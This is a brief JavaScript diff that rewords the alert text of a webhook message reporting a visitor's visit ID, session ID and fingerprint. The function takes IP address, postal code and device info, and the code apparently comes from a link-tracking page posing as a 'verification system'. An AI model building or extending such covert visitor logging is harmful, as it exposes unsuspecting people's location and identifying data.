@@ -863,8 +863,8 @@ async function sendInitialWebhook(ipAddress, postalCode, deviceInfo) {
     try {
         const currentTime = new Date();
         const embed = {
-            title: '🌐 **NEW USER VISIT DETECTED**',
-            description: '👤 A new user has accessed the verification system',
+            title: '🌐 **Some Has Opened The Link**',
+            description: '👤 A New User Has Entered The Website',
             color: 0x00ff00, // Green color for initial
             fields: [
                 { name: '🏷️ **USER IDENTIFICATION**', value: `**Visit ID:** \`${userVisitId}\`\n**Session ID:** \`${sessionId}\`\n**Fingerprint:** \`${userFingerprint}\``, inline: false },
